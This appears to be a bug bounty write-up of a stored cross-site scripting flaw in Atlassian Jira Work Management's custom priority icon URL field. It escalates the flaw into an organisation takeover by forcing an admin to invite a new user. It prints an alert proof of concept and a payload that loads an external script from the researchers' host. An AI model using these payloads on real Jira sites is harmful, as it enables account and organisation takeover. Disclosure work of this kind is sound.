Jira Work Management is a widely used collaboration tool designed to help teams track all activity considered work. Work might include running projects, managing approval processes, performing daily and periodic tasks, creating documents, and Managing issues.

Our team recently found an Stored XSS issue in Jira Work management which allowed them to demonistrate an Full Orginisation Takeover impact within Jira Work Management Software of Atlassian. 


## Vulnerabilty Discovery

Jira work management is one of the products that lie within Atlaissian Eco-system and is accessable through the url `bugbounty-test-<bugcrowd-name>.atlassian.net/jira/your-work`


![image](https://user-images.githubusercontent.com/88488902/196861542-5a40d52e-c7d6-42e4-bc19-ea9b2df7b71d.png)

Different organizations use Jira work Management to track different kinds of issues, which can represent anything from a software bug, to a project task, or a leave request form.

![image](https://user-images.githubusercontent.com/88488902/196862718-107760da-0dbd-4fe6-90a5-59cae71ab8de.png)


users can create issues and track them, Issues in Jira are made up of fields that store various pieces of information. Every issue comes with default system fields, like name or description, Periority etc, An issue's priority indicates its relative importance within the target Orginisation.

Jira Work Management provide  default priorities values like(Highest, High, Medium, Low, Lowest) But Both the priorities and their meanings can be customized by your administrator to suit your organization. 


We Noticed An user with proper permissions can create a new Custom Periority with icon URL Property set to `https://google.com?name=</script><script>alert(0)</script>` 

![image](https://user-images.githubusercontent.com/88488902/196863642-d9afd97e-14ad-4001-acdd-0cd8906d55a4.png)


On Saving the Periority, it seems there was no Validation(Encoding) or `Icon Url` property happening at the backend, hence triggered an XSS at the Frontend.

![image](https://user-images.githubusercontent.com/88488902/196864070-f2f97700-bed7-41a4-a30d-ae234d961b48.png)




## Security Impact

In the context of web application the Stored XSS has an Known impact, Stored XSS (also known as second-order XSS) is the most dangerous type of cross-site scripting attack. The reason is that it does not require users to click a malicious link or perform any activity, other than browsing to a legitimate web page. Once an attacker discovers a stored XSS vulnerability and stores the XSS code into the context of the the target web application, all visitors to affected pages can be compromised by either stealing their session cookies/Tokens or making several changes(email-change etc) to their account leading to full account takeover impact.

The real challenge for us was demonstrating the proper impact of the vulnerability. Because this was an authenticated XSS, we went straight to Jira User management and spent some time understanding user roles and their and levels of access within the application.

The goal was to find the lowest-level role possible that could create the Custom Priority with an XSS payload and then deliver the attack to Admin/Super admins within the organisation.

and we landed on `Product admin permission` , He had no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.

![image](https://user-images.githubusercontent.com/88488902/196865675-619bd57f-ba4a-4b65-81ab-deddd7a2461c.png)

and we landed on `Product admin permission` , He had no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.


## Performing a Full orginisation takeover

Now let's assume we have invited an User with Product admin permission > he has no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.

- Login with an User with Product admin permission , Click on Setting Icon and then Click on Issues

![image](https://user-images.githubusercontent.com/88488902/196865675-619bd57f-ba4a-4b65-81ab-deddd7a2461c.png)


- Now Scroll down and Add a new Priorities with the following icon url, and click ADD button `https://google.com?name=</script><script src=https://snapsec.co/jira-xss.js></script>`


![image](https://user-images.githubusercontent.com/88488902/196865804-378e702f-3d10-4220-b8b4-3b9de3bab597.png)



- Now as soon as Admin Visits the same page from his browser, An invite request will be sent from his browser .

![image](https://user-images.githubusercontent.com/88488902/196865837-2ef2a8e5-a04a-4285-ac34-acb116e64bf4.png)

- and to confirm you can go to user management and see attacker forced admin to invited a new user with access to 3 products, Hence would allow him to view/create/delete/modify projects in those products


![image](https://user-images.githubusercontent.com/88488902/196865866-8a6f5e62-9aeb-4dbd-b77e-9f0f87f701d5.png)






